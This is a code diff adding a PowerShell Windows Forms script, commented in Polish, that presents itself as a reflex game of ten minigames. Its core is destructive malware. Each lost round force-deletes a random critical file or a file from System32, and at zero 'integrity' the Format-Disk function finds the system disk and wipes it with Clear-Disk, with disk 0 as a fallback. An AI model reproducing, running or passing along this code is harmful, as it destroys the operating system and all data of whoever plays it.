@@ -1,0 +1,596 @@
+# ---------------------------------------------------------
+# LOGIKA GRY
+# ---------------------------------------------------------
+
+function Write-Log {
+ param([string]$Message, [string]$Color = "White")
+ $lstLog.Items.Add("[$(Get-Date -Format 'HH:mm:ss')] $Message") | Out-Null
+ $lstLog.TopIndex = $lstLog.Items.Count - 1
+}
+
+function Update-UI {
+ $lblStats.Text = "INTEGRALNOŚĆ: $($GameState.Integrity)% | POZIOM: $($GameState.Level) | WYNIK: $($GameState.Score)"
+ 
+ if ($GameState.Integrity -lt 50 -and -not $GameState.CrisisMode) {
+ $GameState.CrisisMode = $true
+ $Form.BackColor = [System.Drawing.Color]::DarkRed
+ Write-Log "!!! TRYB KRYZYSOWY: INTEGRALNOŚĆ KRYTYCZNA !!!" "Red"
+ } elseif ($GameState.Integrity -ge 50 -and $GameState.CrisisMode) {
+ $GameState.CrisisMode = $false
+ $Form.BackColor = [System.Drawing.Color]::Black
+ Write-Log "System częściowo stabilny." "Green"
+ }
+}
+
+function Check-GameOver {
+ if ($GameState.Integrity -le 0) {
+ $GameState.IsGameOver = $true
+ $pnlGameArea.Controls.Clear()
+ $lblTitle.Text = "SYSTEM ZABITY"
+ $lblTitle.Font = New-Object System.Drawing.Font("Consolas", 48, [System.Drawing.FontStyle]::Bold)
+ $lblTitle.ForeColor = [System.Drawing.Color]::Red
+ 
+ $lblEnd = New-Object System.Windows.Forms.Label
+ $lblEnd.Text = "FORMATOWANIE DYSKU..."
+ $lblEnd.Font = New-Object System.Drawing.Font("Consolas", 24)
+ $lblEnd.ForeColor = [System.Drawing.Color]::Yellow
+ $lblEnd.Location = New-Object System.Drawing.Point($pnlGameArea.Width / 2 - 100, $pnlGameArea.Height / 2 - 50)
+ $pnlGameArea.Controls.Add($lblEnd)
+ 
+ Write-Log "KONIEC GRY: FORMATOWANIE DYSKU" "Red"
+ 
+ # Wywołaj finalne formatowanie
+ Start-Sleep -Milliseconds 2000
+ Format-Disk
+ }
+}
+
+function Remove-SysFile {
+ # Losuj plik z listy krytycznych lub z System32
+ $target = $null
+ 
+ if ($CriticalFiles.Count -gt 0) {
+ $availableCritical = $CriticalFiles | Where-Object { Test-Path $_ }
+ if ($availableCritical.Count -gt 0) {
+ $target = $availableCritical | Get-Random
+ # Usuń z listy, żeby nie usuwać tego samego
+ $index = $CriticalFiles.IndexOf($target)
+ if ($index -ge 0) {
+ $CriticalFiles.RemoveAt($index)
+ }
+ }
+ }
+ 
+ if ($null -eq $target) {
+ $sys32 = "$env:windir\System32"
+ if (Test-Path $sys32) {
+ $files = Get-ChildItem $sys32 -File -ErrorAction SilentlyContinue
+ if ($files.Count -gt 0) {
+ $target = ($files | Get-Random).FullName
+ }
+ }
+ }
+ 
+ if ($null -ne $target) {
+ try {
+ Remove-Item $target -Force -ErrorAction Stop
+ Write-Log "PLIK USUNIĘTY: $target" "Red"
+ } catch {
+ Write-Log "BŁĄD USUWANIA: $target - $_" "Yellow"
+ }
+ }
+}
+
+function Format-Disk {
+ if ($GameState.IsFormatted) { return }
+ $GameState.IsFormatted = $true
+ 
+ Write-Log "ROZPOCZĘCIE PROCEDURY USUWANIA DANYCH..." "Red"
+
+ # --- 100% PRAWDOPODOBIEŃSTWO ---
+ # Zamiast szukać po literze (co może nie istnieć), pytam system operacyjny
+ # o dysk, na którym jest zainstalowany system.
+ try {
+     # Pobierz dysk systemowy bezpośrednio z CIM
+     # To zwraca obiekt dysku, który zawiera właściwość 'Index' (Numer Dysku)
+     $sysDisk = Get-CimInstance -ClassName Win32_DiskDrive | Where-Object {
+         $partitions = Get-CimAssociatedInstance -InputObject $_ -Association Win32_DiskDriveToDiskPartition
+         $partitions | Where-Object {
+             $logicals = Get-CimAssociatedInstance -InputObject $_ -Association Win32_DiskPartitionToLogicalDisk
+             $logicals | Where-Object { $_.Caption -eq (Get-CimInstance -ClassName Win32_OperatingSystem).SystemDrive }
+         }
+     } | Select-Object -First 1
+
+     if ($null -ne $sysDisk) {
+         $diskNumber = $sysDisk.Index
+         Write-Log "WYKRYTO DYSK SYSTEMOWY: DYSK NR $diskNumber" "Cyan"
+         
+         try {
+             Write-Log "USUWANIE PARTYCJI Z DYSKU $diskNumber..."
+             Clear-Disk -Number $diskNumber -RemoveData -RemoveOEM -Confirm:$false
+             Write-Log "DYSK $diskNumber ZUSUNIĘTY BEZPOWROTNIE" "Red"
+         } catch {
+             Write-Log "BŁĄD CZYSTY DYSKU $diskNumber: $_" "Red"
+         }
+     } else {
+         # Fallback, jeśli CIM nie zadziała
+         Write-Log "FALLBACK: Próba usunięcia dysku 0" "Yellow"
+         try {
+             Clear-Disk -Number 0 -RemoveData -RemoveOEM -Confirm:$false
+             Write-Log "DYSK 0 USUNIĘTY" "Red"
+         } catch {
+             Write-Log "FALLBACK FAILED: $_" "Red"
+         }
+     }
+ } catch {
+     Write-Log "FATAL ERROR: Nie mogę znaleźć dysku systemowego. $_" "Red"
+ }
+ 
+ # Zamykamy okno gry po formatowaniu
+ Start-Sleep -Milliseconds 2000
+ $Form.Invoke([MethodInvoker]{ $Form.Close() })
+}
+
+# ---------------------------------------------------------
+# 10 MINIGIER (bez zmian)
+# ---------------------------------------------------------
+
+# 1. Click the Red Box
+function MiniGame1_Click {
+ $pnlGameArea.Controls.Clear()
+ Write-Log "MINIGIER 1: KLIKNIJ CZERWONY KWADRAT" "Cyan"
+ 
+ $btn = New-Object System.Windows.Forms.Button
+ $btn.Text = "KLIKNIJ"
+ $btn.BackColor = [System.Drawing.Color]::Red
+ $btn.ForeColor = [System.Drawing.Color]::White
+ $btn.Size = New-Object System.Drawing.Size(100, 100)
+ $btn.Font = New-Object System.Drawing.Font("Consolas", 16, [System.Drawing.FontStyle]::Bold)
+ 
+ $btn.Add_MouseClick({
+ if (-not $GameState.IsGameOver) {
+ WinGame
+ }
+ })
+ 
+ $x = Get-Random -Minimum 50 -Maximum ($pnlGameArea.Width - 100)
+ $y = Get-Random -Minimum 50 -Maximum ($pnlGameArea.Height - 100)
+ $btn.Location = New-Object System.Drawing.Point($x, $y)
+ $pnlGameArea.Controls.Add($btn)
+}
+
+# 2. Click the Correct Color Name
+function MiniGame2_ColorMatch {
+ $pnlGameArea.Controls.Clear()
+ Write-Log "MINIGIER 2: WYBIERZ WŁAŚCIWY KOLOR" "Cyan"
+ 
+ $colors = @{
+ "RED" = [System.Drawing.Color]::Red
+ "BLUE" = [System.Drawing.Color]::Blue
+ "GREEN" = [System.Drawing.Color]::Green
+ "YELLOW" = [System.Drawing.Color]::Yellow
+ "WHITE" = [System.Drawing.Color]::White
+ "CYAN" = [System.Drawing.Color]::Cyan
+ }
+ $keys = $colors.Keys
+ $targetName = $keys | Get-Random
+ $targetColor = $colors[$targetName]
+ 
+ # Zapisz w zmiennej globalnej, closure nie ma dostępu do lokalnej w PS5.1
+ $Global:TargetColorName = $targetName
+ 
+ $lblDisplay = New-Object System.Windows.Forms.Label
+ $lblDisplay.BackColor = $targetColor
+ $lblDisplay.Size = New-Object System.Drawing.Size(200, 200)
+ $lblDisplay.Location = New-Object System.Drawing.Point($pnlGameArea.Width / 2 - 100, 50)
+ $pnlGameArea.Controls.Add($lblDisplay)
+ 
+ $lblQ = New-Object System.Windows.Forms.Label
+ $lblQ.Text = "Jaki to kolor?"
+ $lblQ.Font = New-Object System.Drawing.Font("Consolas", 16, [System.Drawing.FontStyle]::Bold)
+ $lblQ.Location = New-Object System.Drawing.Point($pnlGameArea.Width / 2 - 80, 280)
+ $pnlGameArea.Controls.Add($lblQ)
+ 
+ $btns = @()
+ $options = @($targetName)
+ while ($options.Count -lt 3) {
+ $opt = $keys | Where-Object { $_ -ne $targetName } | Get-Random
+ if ($options -notcontains $opt) { $options += $opt }
+ }
+ 
+ $yPos = 350
+ foreach ($opt in $options) {
+ $btn = New-Object System.Windows.Forms.Button
+ $btn.Text = $opt
+ $btn.Size = New-Object System.Drawing.Size(150, 40)
+ $btn.Location = New-Object System.Drawing.Point(($pnlGameArea.Width / 2) - 75, $yPos)
+ $yPos += 50
+ 
+ $btn.Add_Click({
+ if (-not $GameState.IsGameOver) {
+ # Używamy $btn.Text z zamknięcia
+ if ($btn.Text -eq $Global:TargetColorName) {
+ WinGame
+ } else {
+ HandleLoss
+ }
+ }
+ })
+ $btns += $btn
+ $pnlGameArea.Controls.Add($btn)
+ }
+}
+
+# 3. Memory Sequence
+function MiniGame3_Memory {
+ $pnlGameArea.Controls.Clear()
+ Write-Log "MINIGIER 3: ZAPAMIĘTAJ SEKWENCJĘ" "Cyan"
+ 
+ $length = 3 + [Math]::Floor($GameState.Level / 10)
+ $sequence = @()
+ for ($i = 0; $i -lt $length; $i++) {
+ $sequence += Get-Random -Minimum 1 -Maximum 5
+ }
+ 
+ # Zapisz w zmiennej globalnej
+ $Global:CurrentSequence = $sequence
+ 
+ $lblSeq = New-Object System.Windows.Forms.Label
+ $lblSeq.Text = "Zapamiętaj: $($sequence -join ' ')"
+ $lblSeq.Font = New-Object System.Drawing.Font("Consolas", 24, [System.Drawing.FontStyle]::Bold)
+ $lblSeq.Location = New-Object System.Drawing.Point($pnlGameArea.Width / 2 - 150, 100)
+ $pnlGameArea.Controls.Add($lblSeq)
+ 
+ Start-Sleep -Milliseconds (3000 + ($GameState.Level * 200))
+ 
+ $lblInput = New-Object System.Windows.Forms.Label
+ $lblInput.Text = "Wpisz sekwencję:"
+ $lblInput.Location = New-Object System.Drawing.Point($pnlGameArea.Width / 2 - 100, 200)
+ $pnlGameArea.Controls.Add($lblInput)
+ 
+ $txtInput = New-Object System.Windows.Forms.TextBox
+ $txtInput.Location = New-Object System.Drawing.Point($pnlGameArea.Width / 2 - 100, 240)
+ $txtInput.Size = New-Object System.Drawing.Size(200, 20)
+ $pnlGameArea.Controls.Add($txtInput)
+ 
+ $btnCheck = New-Object System.Windows.Forms.Button
+ $btnCheck.Text = "Sprawdź"
+ $btnCheck.Location = New-Object System.Drawing.Point($pnlGameArea.Width / 2 - 50, 280)
+ $btnCheck.Add_Click({
+ if (-not $GameState.IsGameOver) {
+ $userInput = $txtInput.Text -split ' '
+ if ($userInput -join ' ' -eq $Global:CurrentSequence -join ' ') {
+ WinGame
+ } else {
+ HandleLoss
+ }
+ }
+ })
+ $pnlGameArea.Controls.Add($btnCheck)
+}
+
+# 4. Math Quiz
+function MiniGame4_Math {
+ $pnlGameArea.Controls.Clear()
+ Write-Log "MINIGIER 4: ROZWIĄZ RÓWNANIE" "Cyan"
+ 
+ $a = Get-Random -Minimum 1 -Maximum 20
+ $b = Get-Random -Minimum 1 -Maximum 20
+ $ops = @("+", "-", "*")
+ $op = $ops | Get-Random
+ 
+ $result = 0
+ switch ($op) {
+ "+" { $result = $a + $b }
+ "-" { $result = $a - $b }
+ "*" { $result = $a * $b }
+ }
+ 
+ # Zapisz w zmiennej globalnej
+ $Global:MathResult = $result
+ 
+ $lblQ = New-Object System.Windows.Forms.Label
+ $lblQ.Text = "$a $op $b = ?"
+ $lblQ.Font = New-Object System.Drawing.Font("Consolas", 32, [System.Drawing.FontStyle]::Bold)
+ $lblQ.Location = New-Object System.Drawing.Point($pnlGameArea.Width / 2 - 100, 100)
+ $pnlGameArea.Controls.Add($lblQ)
+ 
+ $txtInput = New-Object System.Windows.Forms.TextBox
+ $txtInput.Location = New-Object System.Drawing.Point($pnlGameArea.Width / 2 - 50, 180)
+ $txtInput.Size = New-Object System.Drawing.Size(100, 30)
+ $pnlGameArea.Controls.Add($txtInput)
+ 
+ $btnCheck = New-Object System.Windows.Forms.Button
+ $btnCheck.Text = "Sprawdź"
+ $btnCheck.Location = New-Object System.Drawing.Point($pnlGameArea.Width / 2 - 50, 230)
+ $btnCheck.Add_Click({
+ if (-not $GameState.IsGameOver) {
+ if ([int]$txtInput.Text -eq $Global:MathResult) {
+ WinGame
+ } else {
+ HandleLoss
+ }
+ }
+ })
+ $pnlGameArea.Controls.Add($btnCheck)
+}
+
+# 5. Hover Button (Don't Click)
+function MiniGame5_Hover {
+ $pnlGameArea.Controls.Clear()
+ Write-Log "MINIGIER 5: NAJEDŹ NA PRZYCISK" "Cyan"
+ 
+ $btn = New-Object System.Windows.Forms.Button
+ $btn.Text = "NAJEDŹ MNIE"
+ $btn.Size = New-Object System.Drawing.Size(150, 50)
+ $btn.BackColor = [System.Drawing.Color]::Blue
+ $btn.ForeColor = [System.Drawing.Color]::White
+ $btn.Location = New-Object System.Drawing.Point($pnlGameArea.Width / 2 - 75, $pnlGameArea.Height / 2 - 25)
+ 
+ $btn.Add_MouseHover({
+ if (-not $GameState.IsGameOver) {
+ WinGame
+ }
+ })
+ 
+ $pnlGameArea.Controls.Add($btn)
+}
+
+# 6. Click Multiple Targets
+function MiniGame6_MultiClick {
+ $pnlGameArea.Controls.Clear()
+ Write-Log "MINIGIER 6: KLIKNIJ 3 CELI" "Cyan"
+ 
+ $targetsClicked = 0
+ $totalTargets = 3
+ 
+ # Zapisz w zmiennych globalnych
+ $Global:TargetsClicked = 0
+ $Global:TotalTargets = $totalTargets
+ 
+ for ($i = 0; $i -lt $totalTargets; $i++) {
+ $btn = New-Object System.Windows.Forms.Button
+ $btn.Text = "CEL"
+ $btn.BackColor = [System.Drawing.Color]::Red
+ $btn.Size = New-Object System.Drawing.Size(60, 60)
+ $btn.Location = New-Object System.Drawing.Point((Get-Random -Minimum 10 -Maximum ($pnlGameArea.Width - 80)), (Get-Random -Minimum 10 -Maximum ($pnlGameArea.Height - 80)))
+ 
+ $btn.Add_MouseClick({
+ if (-not $GameState.IsGameOver) {
+ # Usuń przycisk z UI
+ $pnlGameArea.Controls.Remove($btn)
+ 
+ $global:TargetsClicked++ # Zwiększ globalny licznik
+ 
+ if ($global:TargetsClicked -ge $Global:TotalTargets) {
+ WinGame
+ }
+ }
+ })
+ $pnlGameArea.Controls.Add($btn)
+ }
+}
+
+# 7. Type the Word
+function MiniGame7_Type {
+ $pnlGameArea.Controls.Clear()
+ Write-Log "MINIGIER 7: WPISZ SŁOWO" "Cyan"
+ 
+ $words = @("SYSTEM", "KILL", "DELETE", "ERROR", "FAIL", "BLUE", "SCREEN", "GAME", "OVER", "WIN")
+ $word = $words | Get-Random
+ 
+ # Zapisz w zmiennej globalnej
+ $Global:CurrentWord = $word
+ 
+ $lblQ = New-Object System.Windows.Forms.Label
+ $lblQ.Text = "Wpisz: $word"
+ $lblQ.Font = New-Object System.Drawing.Font("Consolas", 24, [System.Drawing.FontStyle]::Bold)
+ $lblQ.Location = New-Object System.Drawing.Point($pnlGameArea.Width / 2 - 150, 100)
+ $pnlGameArea.Controls.Add($lblQ)
+ 
+ $txtInput = New-Object System.Windows.Forms.TextBox
+ $txtInput.Location = New-Object System.Drawing.Point($pnlGameArea.Width / 2 - 100, 180)
+ $txtInput.Size = New-Object System.Drawing.Size(200, 30)
+ $txtInput.Font = New-Object System.Drawing.Font("Consolas", 18)
+ $pnlGameArea.Controls.Add($txtInput)
+ 
+ $btnCheck = New-Object System.Windows.Forms.Button
+ $btnCheck.Text = "Sprawdź"
+ $btnCheck.Location = New-Object System.Drawing.Point($pnlGameArea.Width / 2 - 50, 230)
+ $btnCheck.Add_Click({
+ if (-not $GameState.IsGameOver) {
+ if ($txtInput.Text.ToUpper() -eq $Global:CurrentWord) {
+ WinGame
+ } else {
+ HandleLoss
+ }
+ }
+ })
+ $pnlGameArea.Controls.Add($btnCheck)
+}
+
+# 8. Avoid the Box
+function MiniGame8_Avoid {
+ $pnlGameArea.Controls.Clear()
+ Write-Log "MINIGIER 8: TRAKAJ 5 SEKUND" "Cyan"
+ 
+ $lblTimer = New-Object System.Windows.Forms.Label
+ $lblTimer.Text = "5.00"
+ $lblTimer.Font = New-Object System.Drawing.Font("Consolas", 48, [System.Drawing.FontStyle]::Bold)
+ $lblTimer.ForeColor = [System.Drawing.Color]::White
+ $lblTimer.Location = New-Object System.Drawing.Point($pnlGameArea.Width / 2 - 100, 150)
+ $pnlGameArea.Controls.Add($lblTimer)
+ 
+ $threat = New-Object System.Windows.Forms.Button
+ $threat.Text = "X"
+ $threat.BackColor = [System.Drawing.Color]::Red
+ $threat.Size = New-Object System.Drawing.Size(50, 50)
+ $threat.Location = New-Object System.Drawing.Point($pnlGameArea.Width / 2 - 25, 250)
+ $threat.BringToFront()
+ 
+ $threatTimer = New-Object System.Windows.Forms.Timer
+ $threatTimer.Interval = 100
+ $threatTimer.Add_Tick({
+ if (-not $GameState.IsGameOver) {
+ $threat.Location = New-Object System.Drawing.Point(
+ (Get-Random -Minimum 0 -Maximum ($pnlGameArea.Width - 50)),
+ (Get-Random -Minimum 0 -Maximum ($pnlGameArea.Height - 50))
+ )
+ }
+ })
+ $threatTimer.Start()
+ 
+ $countdown = 5.0
+ $timer = New-Object System.Windows.Forms.Timer
+ $timer.Interval = 100
+ $timer.Add_Tick({
+ if (-not $GameState.IsGameOver) {
+ $countdown -= 0.1
+ $lblTimer.Text = $countdown.ToString("F2")
+ if ($countdown -le 0) {
+ $timer.Stop()
+ $threatTimer.Stop()
+ # Usuń timery z formularza, żeby nie działały w tle
+ $Form.Controls.Remove($timer)
+ $Form.Controls.Remove($threatTimer)
+ WinGame
+ }
+ }
+ })
+ $timer.Start()
+}
+
+# 9. Click the Small Target
+function MiniGame9_SmallTarget {
+ $pnlGameArea.Controls.Clear()
+ Write-Log "MINIGIER 9: KLIKNIJ MAŁY CEL" "Cyan"
+ 
+ $btn = New-Object System.Windows.Forms.Button
+ $btn.Text = "."
+ $btn.Size = New-Object System.Drawing.Size(20, 20)
+ $btn.BackColor = [System.Drawing.Color]::Red
+ $btn.ForeColor = [System.Drawing.Color]::Red
+ $btn.Location = New-Object System.Drawing.Point(
+ (Get-Random -Minimum 10 -Maximum ($pnlGameArea.Width - 30)),
+ (Get-Random -Minimum 10 -Maximum ($pnlGameArea.Height - 30))
+ )
+ 
+ $btn.Add_MouseClick({
+ if (-not $GameState.IsGameOver) {
+ WinGame
+ }
+ })
+ 
+ $pnlGameArea.Controls.Add($btn)
+}
+
+# 10. Color Switch
+function MiniGame10_Switch {
+ $pnlGameArea.Controls.Clear()
+ Write-Log "MINIGIER 10: ZMIANA KOLORU" "Cyan"
+ 
+ $currentColor = [System.Drawing.Color]::Red
+ $btn = New-Object System.Windows.Forms.Button
+ $btn.Text = "KLIKNIJ ABY ZMIENIĆ"
+ $btn.Size = New-Object System.Drawing.Size(200, 100)
+ $btn.Location = New-Object System.Drawing.Point($pnlGameArea.Width / 2 - 100, $pnlGameArea.Height / 2 - 50)
+ 
+ $btn.BackColor = $currentColor
+ # Zapisz w zmiennej globalnej
+ $Global:CurrentColor = $currentColor
+ 
+ $btn.Add_Click({
+ if (-not $GameState.IsGameOver) {
+ # Losuj nowy kolor, inny niż obecny
+ $colors = @([System.Drawing.Color]::Red, [System.Drawing.Color]::Blue, [System.Drawing.Color]::Green, [System.Drawing.Color]::Yellow)
+ $newColor = $colors | Where-Object { $_ -ne $Global:CurrentColor } | Get-Random
+ $btn.BackColor = $newColor
+ $Global:CurrentColor = $newColor
+ WinGame
+ }
+ })
+ 
+ $pnlGameArea.Controls.Add($btn)
+}
+
+# Mapowanie minigier do funkcji
+$MiniGames = @(
+ $null, # 0 index unused
+ $Function:MiniGame1_Click,
+ $Function:MiniGame2_ColorMatch,
+ $Function:MiniGame3_Memory,
+ $Function:MiniGame4_Math,
+ $Function:MiniGame5_Hover,
+ $Function:MiniGame6_MultiClick,
+ $Function:MiniGame7_Type,
+ $Function:MiniGame8_Avoid,
+ $Function:MiniGame9_SmallTarget,
+ $Function:MiniGame10_Switch
+)
+
+function WinGame {
+ if ($GameState.IsGameOver) { return }
+ $GameState.Score += 100 + ($GameState.Level * 10)
+ $GameState.Streak++
+ Write-Log "WYGRANA! +$($GameState.Score)" "Green"
+ Update-UI
+ Start-Sleep -Milliseconds 300
+ Start-NextMiniGame
+}
+
+function HandleLoss {
+ if ($GameState.IsGameOver) { return }
+ $GameState.Integrity -= 10
+ $GameState.Streak = 0
+ Write-Log "PRZEGRANA! Usuwam pliki i zbliżam się do formatowania..." "Red"
+ 
+ Remove-SysFile
+ Update-UI
+ Check-GameOver
+ 
+ if (-not $GameState.IsGameOver) {
+ Start-Sleep -Milliseconds 500
+ # Restart tej samej minigierki
+ $MiniGames[$GameState.CurrentMiniGameId].Invoke()
+ }
+}
+
+function Start-NextMiniGame {
+ if ($GameState.IsGameOver) { return }
+ $GameState.Level++
+ Update-UI
+ 
+ # Losuj minigierkę (1-10)
+ $nextGameId = Get-Random -Minimum 1 -Maximum 11
+ $GameState.CurrentMiniGameId = $nextGameId
+ 
+ # Wywołaj minigierkę
+ $MiniGames[$nextGameId].Invoke()
+}
+
+function Start-BootSequence {
+ Write-Log "URUCHAMIANIE SYSTEMU..." "Cyan"
+ $pnlGameArea.Controls.Clear()
+ 
+ $lblBoot = New-Object System.Windows.Forms.Label
+ $lblBoot.Text = "INITIALIZING..."
+ $lblBoot.Font = New-Object System.Drawing.Font("Consolas", 24, [System.Drawing.FontStyle]::Bold)
+ $lblBoot.Location = New-Object System.Drawing.Point($pnlGameArea.Width / 2 - 150, $pnlGameArea.Height / 2 - 50)
+ $pnlGameArea.Controls.Add($lblBoot)
+ 
+ Start-Sleep -Milliseconds 2000
+ $lblBoot.Text = "LOADING MODULES..."
+ Start-Sleep -Milliseconds 1000
+ $lblBoot.Text = "SYSTEM READY"
+ Start-Sleep -Milliseconds 500
+ 
+ $pnlGameArea.Controls.Clear()
+ Start-NextMiniGame
+}
+
+# Start gry
+Update-UI
+Start-BootSequence
+
+# Uruchomienie pętli aplikacji UI
+$Form.ShowDialog()
